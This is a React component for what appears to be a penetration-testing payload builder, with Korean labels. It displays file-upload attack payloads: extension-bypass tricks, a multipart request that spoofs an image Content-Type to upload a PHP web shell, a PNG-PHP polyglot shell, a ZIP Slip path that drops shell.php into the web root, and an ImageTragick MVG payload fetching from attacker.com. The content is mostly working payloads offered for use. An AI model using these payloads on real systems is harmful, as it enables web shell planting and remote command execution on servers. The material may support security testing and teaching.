import { DISCLAIMER, Note, Readout } from './shared'

export function FileUploadPayloadBuilder() {
  const extensions = [
    { label: 'PHP 기본', code: '.php' },
    { label: 'PHP 변형', code: '.phtml, .php5, .pht' },
    { label: '이중 확장자', code: '.php.jpg, .php.png, .php.gif' },
    { label: '우회 문자', code: '.asp;.jpg, .php%00.jpg, .php.jpg' },
  ]

  const mimeSpoof = `Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/png

<?php system($_GET['cmd']); ?>`

  const polyglot = `\\x89PNG\\r\\n\\x1a\\n<?php system($_GET['cmd']); ?>`

  const zipSlip = [
    { label: '경로 조작 엔트리 이름', code: '../../../var/www/html/shell.php' },
    { label: '생성 명령어', code: 'zip evil.zip "../../../var/www/html/shell.php"' },
    { label: '주의', code: '대부분의 최신 zip 도구는 경로 조작을 차단하므로, 직접 바이너리를 수정하거나 구버전 도구를 사용해야 함' },
  ]

  const imageTragick = `push graphic-context
viewbox 0 0 640 480
fill hsl(0, 0%, 100%)
image over 0,0 "https://attacker.com/shell.php"
pop graphic-context`

  return (
    <div className="payload-builder">
      <Note>{DISCLAIMER}</Note>
      
      <div className="payload-readout-group">
        <strong className="payload-group-title">확장자 우회 리스트</strong>
        {extensions.map((e, i) => (
          <Readout key={i} title={e.label} value={e.code} wrap="anywhere" />
        ))}
      </div>

      <div className="payload-readout-group">
        <strong className="payload-group-title">MIME/Content-Type 스푸핑 예시</strong>
        <Readout title="Multipart Form-Data Payload" value={mimeSpoof} wrap="pre" />
        <Note>멀티파트 바디에서 Content-Type을 image/png 등으로 속여 업로드 필터를 우회합니다.</Note>
      </div>

      <div className="payload-readout-group">
        <strong className="payload-group-title">매직바이트 폴리글랏 (PNG-PHP)</strong>
        <Readout title="Hex Representation" value={polyglot} wrap="anywhere" />
        <Note>파일 시작 부분에 PNG 헤더를 붙여 파일 검사기를 속입니다.</Note>
      </div>

      <div className="payload-readout-group">
        <strong className="payload-group-title">ZIP Slip (경로 조작)</strong>
        {zipSlip.map((z, i) => (
          <Readout key={i} title={z.label} value={z.code} wrap="anywhere" />
        ))}
      </div>

      <div className="payload-readout-group">
        <strong className="payload-group-title">ImageMagick / ImageTragick</strong>
        <Readout title="MVG Payload" value={imageTragick} wrap="pre" />
        <Note>MVG 구문의 push graphic-context 등을 이용한 원격 파일 포함/실행 취약점입니다.</Note>
      </div>
    </div>
  )
}

export default FileUploadPayloadBuilder
